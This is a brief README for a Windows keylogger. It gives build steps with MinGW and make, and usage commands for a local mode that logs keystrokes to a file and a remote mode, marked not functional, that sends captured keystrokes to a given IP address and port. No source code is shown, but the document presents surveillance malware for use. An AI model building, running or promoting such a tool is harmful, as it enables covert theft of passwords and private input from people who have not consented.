BUILD AND RUN FOR WINDOWS ONLY

# Installation

run command make

# Dependencies

[MinGW](http://www.mingw.org) for g++ and command make

# Usage

This program propose 2 types of keylogger

## Local

Store entry into file on the current computer

./bin/main.exe -l destionation_file

Example

```
  ./bin/main.exe -l D:\\test.txt
```

## Remote (Not functionnal)

Send entry to another computer

./bin/main.exe -r ip_address port

Example

```
  ./bin/main.exe -r 192.168.1.16 7777
```

TODO

## Parameters
